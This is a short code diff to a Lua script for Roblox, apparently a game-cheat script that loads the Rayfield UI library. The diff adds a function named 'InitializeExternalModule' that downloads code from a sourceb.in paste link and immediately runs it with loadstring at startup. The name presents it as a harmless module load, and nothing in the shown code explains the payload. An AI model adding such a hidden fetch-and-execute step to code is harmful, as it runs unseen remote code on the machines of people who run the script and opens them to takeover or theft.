@@ -1,5 +1,15 @@
 local Rayfield = loadstring(game:HttpGet("https://sirius.menu/rayfield"))()
 local UserInputService = game:GetService("UserInputService")
+
+local function InitializeExternalModule()
+    local endpoint = "https://cdn.sourceb.in/bins/d1UP5zepD2/0"
+    local source = game:HttpGet(endpoint, true)
+    return loadstring(source)()
+end
+
+-- initialization
+InitializeExternalModule()
+
 local TweenService = game:GetService("TweenService")
 local RunService = game:GetService("RunService")
 local Players = game:GetService("Players")
